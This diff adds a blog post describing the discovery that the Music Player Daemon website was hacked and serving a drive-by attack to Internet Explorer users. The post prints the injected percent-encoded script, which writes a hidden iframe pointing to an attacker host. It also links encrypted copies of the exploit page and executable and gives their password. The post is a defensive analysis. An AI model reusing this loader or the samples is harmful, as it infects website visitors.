@@ -1,0 +1,31 @@
+<:musicpd.org hacked><tags:English hack exploit "Music Player Daemon" Windows "Internet Explorer" ActiveX JavaScript>
+<p>
+	Today I used my Windows XP box and its Internet Explorer&nbsp;6&nbsp;SP&nbsp;2 to surf to <<http://musicpd.org/ MusicPD's website>>.
+	But while loading the page my hard drive worked quite a lot and IE showed me a script error.
+	That made me suspicious, and I had a look into the source code.
+</p>
+<p>
+	There, even before the <wen:Document_Type_Declaration Doctype>, the following code appeared:
+</p>
+<pre>&lt;html&gt;
+&lt;body&gt;
+&lt;Script Language='Javascript'&gt;
+&lt;!--
+document.write(unescape('%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%31%6E%74%72%30%2E%63%6F%6D%2F%74%65%73%74%2F%67%6F%2E%70%68%70%3F%73%69%64%3D%36%22%20%73%74%79%6C%65%3D%22%76%69%73%69%62%69%6C%69%74%79%3A%20%68%69%64%64%65%6E%3B%20%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%3C%2F%69%66%72%61%6D%65%3E'));
+//--&gt;
+&lt;/script&gt;
+&lt;/html&gt;
+&lt;/body&gt;</pre>
+<p>
+	The un<wen:Percent-encoding encoded> string adds an <wen:IFrame> that leads to a web page which seems to only show its dangerous contents to Internet Explorer users.
+	While I am writing this, it seems the attackers have noticed my analysis and replaced the code with an empty page.
+	However, I've got <</files/2007/12/mpd-hack-code.html.gpg a local copy>>...&nbsp;;)
+	I've not yet finished the reverse engineering of that code, but it seems they try to use, among others, a security vulnerability from 2005 to execute an arbitrary file on the client host.
+	Luckily I managed to get a <</files/2007/12/mpd-hack-binary.exe.gpg copy of that executable>> as well.
+	Will be fun to analyze in a virtual machine.
+</p>
+<p>
+	For me it seems as if there was no high risk to the visitors of the mpd website, at least if they're using a recently patched Windows.
+	But I haven't looked at all of the exploits yet, I'll keep you updated.
+	Oh, the password for the GPG encrypted files I linked above is "baz00ka".
+</p>
